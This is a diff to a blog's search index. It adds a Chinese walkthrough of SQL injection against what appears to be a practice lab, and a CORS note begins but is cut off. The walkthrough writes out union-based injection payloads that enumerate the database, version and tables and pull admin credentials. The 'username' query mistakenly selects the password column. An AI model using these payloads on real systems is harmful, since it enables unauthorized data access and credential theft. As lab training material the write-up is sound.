@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>猫舍SQL注入</title>
+    <url>/2019/12/13/%E7%8C%AB%E8%88%8DSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="查看是否有SQL注入漏洞"><a href="#查看是否有SQL注入漏洞" class="headerlink" title="查看是否有SQL注入漏洞"></a>查看是否有SQL注入漏洞</h4><p><img src="http://q20wi1s2d.bkt.clouddn.com/判断是否有SQL注入.png" alt="这次的目标"></p>
+<p>这个 url  后面加了and 1=1   发现页面没有变化    然后   加了and 1=2    页面变化      </p>
+<p>说明有SQL注入漏洞</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/发现有SQL注入.png" alt="发现有漏洞"></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/发现有SQL注入，返回不正常.png" alt="返回不正常"></p>
+<h3 id="对其进行确定-发现有几列的数据"><a href="#对其进行确定-发现有几列的数据" class="headerlink" title="对其进行确定 发现有几列的数据"></a>对其进行确定 发现有几列的数据</h3><p>在  url  加上    and 1=2 order by 1  </p>
+<p>and 1=2 order by 2</p>
+<p>and 1=2 order by 3</p>
+<p>依次来发现 有几列数据</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/进行确定有几行的列表.png" alt="确定有几行"></p>
+<p>返回查询失败</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/查询返回失败.png" alt="返回查询失败"></p>
+<h3 id="来发现返回的信息点在哪里"><a href="#来发现返回的信息点在哪里" class="headerlink" title="来发现返回的信息点在哪里"></a>来发现返回的信息点在哪里</h3><p>哪里 显示信息点</p>
+<p>构造 <code>?id=1 and 1=2 union select 1,2</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/判断信息返回点.png" alt="信息点"></p>
+<h3 id="判断-返回数据库名字"><a href="#判断-返回数据库名字" class="headerlink" title="判断 返回数据库名字"></a>判断 返回数据库名字</h3><p>返回数据库名字</p>
+<p>构造 <code>?id=1 and 1=2 union select 1,database()</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/返回数据库名字.png" alt="数据库名字"></p>
+<p>查看这个数据库版本</p>
+<p>构造 <code>?id=1 and 1=2 union select 1,version()</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/返回版本结果.png" alt="查看这个数据库版本">   </p>
+<p>返回  表名</p>
+<p>构造</p>
+<p><code>?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/查询到表名.png" alt="返回 表"></p>
+<h3 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h3><p>查询用户名  和密码</p>
+<p>用户名 <code>?id=1 and 1=2 union select 1,password from admin  limit 1,1</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/返回用户名.png" alt="用户名"></p>
+<p>密码 <code>?id=1 and 1=2 union select 1,password from admin  limit 0,1</code></p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/密码返回.png" alt="密码"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一段时间总结</title>
     <url>/2019/12/12/%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>我感觉这个东西 实现挺简单的，主要是对一个origin的进行改变，使自己出现在Access-Control-Allow-Origin标头中，获取到对这个网站的访问权</p>
